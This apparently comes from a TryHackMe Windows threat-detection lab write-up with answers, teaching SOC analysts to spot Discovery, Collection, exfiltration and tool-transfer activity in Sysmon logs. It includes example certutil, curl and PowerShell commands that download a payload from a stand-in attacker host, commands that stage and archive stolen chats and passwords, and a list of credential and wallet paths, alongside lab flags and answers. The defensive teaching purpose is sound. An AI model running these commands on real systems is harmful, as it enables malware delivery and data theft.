
### Introduction

After breaching a host, threat actors are faced with a choice: quietly establish a backdoor to maintain long-term access or take immediate action to achieve their objectives. This room covers the second approach and continues your Windows threat detection journey by exploring what typically follows the Initial Access, beginning with Discovery and Collection.

##### Learning Objectives

- Detect common Discovery techniques using Windows Event Log
- Learn how to trace the attack origin by reconstructing a process tree
- Find out what data threat actors look for and how they exfiltrate it
- See how the malicious commands are logged by running them yourself

##### Prerequisites

- Recall the basics of [MITRE](https://tryhackme.com/room/mitre) tactics and [Windows](https://tryhackme.com/room/windowsloggingforsoc) logs
- Complete the previous room, [Windows Threat Detection 1](https://tryhackme.com/room/windowsthreatdetection1)
- Be ready to continue your Windows threat detection journey

### Discovery Overview

##### Situational Awareness
After the criminals pass through the front door, do they know what's behind the door? Most do not, so they will start searching the rooms: maybe there is a hidden treasure, but maybe a trap ready for action. Same for the cyber threat actors, who need to understand the environment, its value, and its security tools that can disrupt the attack. This process is mapped to the MITRE Discovery tactic, which we will cover in this task.

##### Discovery Commands
The first questions you may have once you wake up from a dream might be "Who am I?" and "Where am I?". The same is true for threat actors that might have sent thousands of phishing attachments to all emails they knew but managed to breach only a couple of systems they saw for the first time. So, they need to find out the victim's details:

| Discovery Purpose                                                                                    | Common CMD / PowerShell Commands                                                          |
| ---------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------- |
| **Files and Folders**  <br>(To find out the host purpose, victim's job, or their interests)          | `type <file>`, `Get-Content <file>`, `dir <folder>`, `Get-ChildItem <folder>`             |
| **Users and Groups**  <br>(To find out who uses the host and with which privileges)                  | `whoami`, `net user`, `net localgroup`, `query user`, `Get-LocalUser`                     |
| **System and Apps**  <br>(To find out vulnerabilities or apps to steal data from)                    | `tasklist /v`, `systeminfo`, `wmic product get name,version`, `Get-Service`               |
| **Network Settings**  <br>(To find out if the host belongs to a corporate network)                   | `ipconfig /all`, `netstat -ano`, `netsh advfirewall show allprofiles`                     |
| **Active Antivirus**  <br>(To find out how risky it is to continue the attack without being blocked) | `Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntivirusProduct"` |

**Task 1**
- Open CMD and type "net user Administrator". Which privileged group does the user belong to?
	- Administrators
- Open Event Viewer and try to find your command in Sysmon logs. What is the "Image" field of the net command you just run?
	- `C:\Windows\System32\net.exe`


### Detecting Discovery

##### Discovery via CMD

Discovery via the command line is the most common and easiest method available for threat actors. This is because it simply uses the existing commands like "whoami" or "ipconfig" that are available on all Windows machines by default; check out [this article](https://thedfirreport.com/2024/08/26/blacksuit-ransomware/#collection:~:text=The%20threat%20actor%20performed%20several%20discovery%20commands) for a real-world attack example. Luckily for the defenders, most of the launched commands are logged as new processes, like on the process tree below:

![Pasted image 20250722232353.png](assets/windows-threat-detection-2/Pasted%20image%2020250722232353.png)

##### Discovery via GUI

In cases where threat actors log in to the system interactively, like after the RDP breach, they are not limited to console commands (but they often use them anyway as a habit). With access to the graphical interface, nothing prevents attackers from using the same toolkit as you do: Apps & Programs, System Settings, Disk Management, or even Event Viewer. In this scenario, you won't see typical "whoami" commands but rather a process tree that looks like this:

![Pasted image 20250722232444.png](assets/windows-threat-detection-2/Pasted%20image%2020250722232444.png)

##### Detecting Discovery

The first task to detect a potential Discovery is to find a Discovery command, or better, a sequence of commands run during a short period of time. You will see them as process creation events tracked by Sysmon event ID 1 or as new rows in the PowerShell history file. There are [lots](https://cheatsheet.haax.fr/windows-systems/local-and-physical/local_recon_enumeration/) of Discovery commands, so be prepared to use the search engine if you are not sure what the command means.

Next, it is important to find out where the commands are coming from. Commands like "ipconfig" are often used by IT departments and legitimate tools, and you don't want to create panic just because your coworker checked their IP. For this room, you can build the process tree using Sysmon logs: filter for process creation events and correlate ProcessId and ParentProcessId fields, like in the example below:

![Pasted image 20250722232654.png](assets/windows-threat-detection-2/Pasted%20image%2020250722232654.png)

**Task 2**
- Looking at Sysmon logs, what is the first command the invoice.pdf.exe executes?
	- whoami
- Which command did the malware use to check the presence of MS Defender EDR?
	- `cmd /c "tasklist /v | findstr MsSense.exe || echo No MS Defender EDR"`
- To which domain did the malware send the discovered data?
	- `exfil.beecz.cafe`


### Collection Overview

##### Searching Secrets

![Pasted image 20250722233555.png](assets/windows-threat-detection-2/Pasted%20image%2020250722233555.png)

##### Collection Targets
The targets drastically differ depending on the attackers' goals. Some adversaries hunt personal info like images or chat conversations; others look for crypto wallets, gaming, or banking accounts; and advanced groups just use the victim to access the corporate network, hoping for a full-scale ransomware encryption.

Note that while most of the sensitive data is stored as simple files, the secrets can also be hidden in the registry or in process memory. You can review the common Collection targets in the code block below:

```
# [Goal: Blackmail Victim] Photos, Chats, Browser History
C:\Users\<user>\AppData\Roaming\Signal\*
C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\History

# [Goal: Steal Money] Web Banking Sessions, Crypto Wallets
C:\Users\<user>\AppData\Roaming\Bitcoin\wallet.dat
C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Cookies

# [Goal: Steal Corporate Data] SSH Credentials, Databases
C:\Users\<user>\.ssh\*
C:\Program Files\Microsoft SQL Server\...\DATA\*
```

##### Exfiltrating Data
Data collection can be performed automatically via scripts or manually by human threat actors. For scripts, the whole process usually takes less than a minute, but it may take hours for the attacker to find and review the interesting files. Still, both methods should eventually end with exfiltration - uploading stolen data to a controller server. Here, threat actors can be very creative - to avoid detection, they often:
- Exfiltrate stolen data to DropBox, Mega, Amazon S3, or other trusted cloud storage services ([Examples](https://attack.mitre.org/techniques/T1567/002/#:~:text=Procedure%20Examples))
- Exfiltrate stolen data to known code repositories like GitHub or messengers like Telegram ([Example](https://cyberint.com/blog/research/the-new-infostealer-in-town-the-continental-stealer/#:~:text=offers%20a%20Telegram%20bot%20notification%20feature%20that%20informs%20users))
- Or just create a trustworthy-looking domain like "windows-updates.com" and send the data there

**Task 3**
- What is the Facebook password that the user saved in Chrome? (Chrome menu > Passwords and autofill > Password Manager)
	- nsAghv51BBav90!
- Which interesting SSH key does the user store on disk? (Start your search from C:\Users\Administrator\)
	- thm-access-database.key
- What is the secret PDF file explaining TryHackMe's internal network? (Look for the file on the Desktop, Downloads, and Documents)
	- thm-network-diagram-2025


### Detecting Collection
Same as with Discovery, threat actors can use both command-line and graphical interface options to review sensitive files. However, in Collection, threat actors don't just check a system configuration but rather look for specific files and folders shown in the previous task. Thus, you can detect access to the files by tracking commands like:

| Command Example                                                        | Description                                                                     |
| ---------------------------------------------------------------------- | ------------------------------------------------------------------------------- |
| `notepad.exe C:\Users\<user>\Desktop\finances-2025.csv`                | Threat actors used Notepad to check content of the interesting file             |
| CMD: `type debug-logs.txt \| findstr password > C:\Temp\passwords.txt` | Threat actors searched for the "password" keyword in a specific file            |
| PowerShell: `Get-ChildItem C:\Users\<user> -Recurse -Filter *.pdf`     | Threat actors searched for PDF files in the user's home folder                  |
| PowerShell: `copy C:\Users\<user>\AppData\Roaming\Signal С:\Temp\`     | Threat actors copied Signal chat history to the Temp directory                  |
| PowerShell: `Compress-Archive С:\Temp\ С:\Temp\stolen_data.zip`        | Threat actors archived the stolen data, preparing for exfiltration              |
| `7za.exe a -tzip C:\Temp\stolen_data.zip С:\\Temp\\*.*`                | Alternatively, threat actors can use the existing archiving software like 7-Zip |

##### Collection Examples
During manual collection or when using scripts, you will see basic commands and processes covered in the previous task. In [this incident](https://thedfirreport.com/2024/08/26/blacksuit-ransomware/#collection), threat actors simply used Notepad and Wordpad to open files of interest and then used 7-Zip to archive all files at once. As you may see from the screenshot, the actions were easily detected with Sysmon event ID 1:

![Pasted image 20250722234803.png](assets/windows-threat-detection-2/Pasted%20image%2020250722234803.png)

###### Data Stealers
Collection performed by human threat actors is typical for breaches of big networks, where the attacker knows their target and spends much time looking for data to steal. However, attacks targeting simple personal workstations rarely involve human attacker and data collection is performed by a data stealer - specialized malware to automate collection and exfiltration.

For example, Gremlin data stealer, a single malicious file, steals VPN profiles, cryptocurrency wallets, web browser sessions, Steam, Discord, and Telegram data, and even takes screenshots of the victim's host. You can read the details in [this Unit42 blog post](https://unit42.paloaltonetworks.com/new-malware-gremlin-stealer-for-sale-on-telegram/). Note that data stealers rarely use CMD or PowerShell commands but rely on their own code, making it harder to understand which exact data was accessed or stolen.

For this task, run a simple data stealer sample and analyze its actions in logs:  
`C:\Users\Administrator\Desktop\Practice\Task 5\stealer.exe`

**Task 4**
- Looking at Sysmon logs, what directory does the stealer create?
	- staging_58f1
- Which three file extensions does the malware search for? Format: Separate by comma in alphabetic order (e.g. bat, txt)
	- docx, pdf, xlsx
- Which PowerShell cmdlet does the malware use to get clipboard content?
	- Get-ClipBoard
- Which domain does the malware exfiltrate the data to?
	- collecteddata-storage-2025.s3.amazonaws.com


### Ingress Tool Transfer

##### Ingress Tool Transfer

Recall the previous room explaining how attacks start: not from a fully functional malware, but from a tiny phishing attachment or from an RDP session without any red team tools. Thus, at some attack stages, threat actors may need to download more tools to achieve their goals, for example:

- A script to automate Discovery and find common vulnerabilities like [Seatbelt](https://github.com/GhostPack/Seatbelt)
- A tool to extract saved passwords or OS credentials like [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- A fully functional Remote Access Trojan (RAT) like [Remcos RAT](https://www.checkpoint.com/cyber-hub/threat-prevention/what-is-malware/remcos-malware/)
- Finally, a ransomware binary to encrypt the system after the data is stolen

The process of downloading additional malware to the breached system is mapped to the MITRE [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/) technique, and it is used in the majority of breaches. You have already seen an example where a LNK attachment used PowerShell to download additional malware, but there are many other ways to transfer malware even without PowerShell!

##### Common Tool Transfer
Why can't the threat actors just include all they need into a single phishing attachment, you may ask. There can be different reasons, but the common ones are to bypass antivirus by splitting the malware into multiple parts and to minimize exposure of their tools/exploits in case they're caught right in the beginning.

|Ingress Tool Transfer Command|Common CMD / PowerShell Commands|
|---|---|
|Via Certutil|`certutil.exe -urlcache -f https://blackhat.thm/bad.exe good.exe`|
|Via Curl (Windows 10+)|`curl.exe https://blackhat.thm/bad.exe -o good.exe`|
|Via PowerShell [IWR](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest)|`powershell -c "Invoke-WebRequest -Uri 'https://blackhat.thm/bad.exe' -OutFile 'good.exe'"`|
|Via Graphical Interface|No need to use CMD, just copy-paste malware via RDP or download them via a web browser!|
##### Detecting Tool Transfer
Since a transfer requires a network connection, your best option would be to track a network connection or a DNS request from the suspicious process. Note, however, that threat actors often try to avoid detection by downloading the tools from legitimate services like GitHub, so make sure to analyze which process is making the connection, the destination domain, and the file being downloaded. The screenshot below shows a complete event chain:

![Pasted image 20250723000224.png](assets/windows-threat-detection-2/Pasted%20image%2020250723000224.png)

For this task, continue with the VM and test the Ingress Tool Transfer yourself!  
Use the URL [http://appsforfree.thm/trojan.exe](http://appsforfree.thm/trojan.exe) to answer the below questions.

**Task 5**
- Open the Chrome browser on the VM and navigate to the URL. What is the flag in the response?
	- THM{just_use_web_browser}
- Next, open CMD and download the file from the same URL using curl.exe. What is the flag in the response?
	- THM{curl_is_cool}
- Continue with the same CMD and URL, but now using certutil.exe. What is the flag in the response?
	- THM{abusing_certutil}
- Finally, download the same file using PowerShell IWR. What is the flag in the response?
	- THM{power_of_powershell}














